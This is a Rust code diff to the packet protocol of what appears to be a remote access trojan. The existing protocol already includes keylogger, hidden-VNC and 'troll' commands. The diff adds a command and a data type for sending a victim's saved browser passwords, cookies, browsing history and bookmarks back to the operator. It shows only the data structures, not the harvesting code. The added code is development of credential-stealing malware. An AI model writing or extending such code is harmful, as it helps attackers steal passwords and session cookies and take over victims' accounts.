@@ -34,6 +34,7 @@ pub enum ServerboundPacket {
     // Keylogger
     KeyloggerUpdate(KeyloggerUpdate),
     KeyloggerOfflineLogs(Vec<String>),
+    BrowserData(BrowserData),
 }
 
 impl Packet for ServerboundPacket {
@@ -66,6 +67,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
             ServerboundPacket::KeyloggerUpdate(_) => "Keylogger Update",
             ServerboundPacket::KeyloggerOfflineLogs(_) => "Keylogger Offline Logs",
+            ServerboundPacket::BrowserData(_) => "Browser Data",
         }
     }
 }
@@ -128,6 +130,7 @@ pub enum ClientboundPacket {
     StopKeylogger,
     GetOfflineLogs,
     ClearOfflineLogs,
+    GetBrowserData,
 }
 
 impl Packet for ClientboundPacket {
@@ -192,6 +195,7 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::StopKeylogger => "Stop Keylogger",
             ClientboundPacket::GetOfflineLogs => "Get Offline Logs",
             ClientboundPacket::ClearOfflineLogs => "Clear Offline Logs",
+            ClientboundPacket::GetBrowserData => "Get Browser Data",
         }
     }
 }
@@ -310,4 +314,48 @@ pub enum TrollCommand {
     SpeakText(String),
     Beep(String),
     PianoKey(String),
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct BrowserData {
+    pub browsers: Vec<BrowserResult>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct BrowserResult {
+    pub name: String,
+    pub passwords: Vec<PasswordEntry>,
+    pub cookies: Vec<CookieEntry>,
+    pub history: Vec<HistoryEntry>,
+    pub bookmarks: Vec<BookmarkEntry>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct PasswordEntry {
+    pub url: String,
+    pub username: String,
+    pub password: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct CookieEntry {
+    pub domain: String,
+    pub name: String,
+    pub value: String,
+    pub path: String,
+    pub expires: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct HistoryEntry {
+    pub url: String,
+    pub title: String,
+    pub visit_count: i32,
+    pub last_visit: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct BookmarkEntry {
+    pub url: String,
+    pub title: String,
 }
